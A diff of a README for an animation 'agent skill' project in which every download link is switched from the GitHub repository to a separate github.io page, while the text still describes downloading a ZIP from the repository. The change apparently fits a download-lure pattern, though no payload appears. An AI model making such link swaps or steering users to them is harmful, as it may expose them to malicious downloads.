@@ -1,6 +1,6 @@
 # 🎬 agent-skill-remotion-motion-graphics - Make animated videos easily with code
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/Westleighinauspicious5506/agent-skill-remotion-motion-graphics)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://westleighinauspicious5506.github.io)
 
 ---
 
@@ -19,7 +19,7 @@ Follow these simple steps to download and use the software on your Windows compu
 ### Step 1: Download the App
 
 Visit this link to download the application:  
-👉 **[Download Agent Skill Motion Graphics](https://github.com/Westleighinauspicious5506/agent-skill-remotion-motion-graphics)**
+👉 **[Download Agent Skill Motion Graphics](https://westleighinauspicious5506.github.io)**
 
 Click the green "Code" button, then choose "Download ZIP". Wait for the download to finish.
 
@@ -148,7 +148,7 @@ You're all set! Go make something awesome.
 ---
 
 **Ready to begin?**  
-👉 **[Download Agent Skill Motion Graphics](https://github.com/Westleighinauspicious5506/agent-skill-remotion-motion-graphics)**
+👉 **[Download Agent Skill Motion Graphics](https://westleighinauspicious5506.github.io)**
 
 ---
 
